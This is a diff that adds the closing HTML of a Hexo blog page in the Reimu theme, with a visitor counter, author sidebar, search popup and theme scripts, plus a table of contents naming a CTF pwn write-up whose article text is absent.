+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi "></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%BC%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text"> 导言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text"> 前置知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-ciscn-2019%E8%A5%BF%E5%8D%97pwn1"><span class="toc-number">3.</span> <span class="toc-text"> 例题 [CISCN 2019西南]PWN1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec"><span class="toc-number">3.1.</span> <span class="toc-text"> checksec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">3.2.</span> <span class="toc-text"> 代码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-number">3.3.</span> <span class="toc-text"> Payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E6%97%A5%E8%B0%88"><span class="toc-number">4.</span> <span class="toc-text"> 后日谈</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#loop%E9%93%BE"><span class="toc-number">4.1.</span> <span class="toc-text"> Loop链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rop%E9%93%BE%E6%94%BB%E5%87%BB"><span class="toc-number">4.2.</span> <span class="toc-text"> ROP链攻击</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Dusk" class="lazyload">
+  <div class="sidebar-author-name">Dusk</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">14</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div class="reimu-search-input" id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png"/>
+        </div>
+      </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+  
+<script src="/js/generator_search.js" defer></script>
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.0.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+<script data-pjax>
+  var updateTime = _$('#post-update-time')?.innerHTML;
+
+  if (updateTime) {
+    const update = new Date(updateTime);
+    const now = new Date();
+    const diff = now - update;
+    const days = diff / 86400000;
+    const { daysAgo, message: template } = window.REIMU_CONFIG.outdate;
+    if (days >= daysAgo) {
+      const message = template.replace(/{time}/, updateTime);
+      const blockquote = _$('#outdate-blockquote');
+      if (blockquote) {
+        blockquote.querySelector('p').innerText = message;
+        blockquote.style.display = 'block';
+      }
+    }
+  }
+</script>
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
+
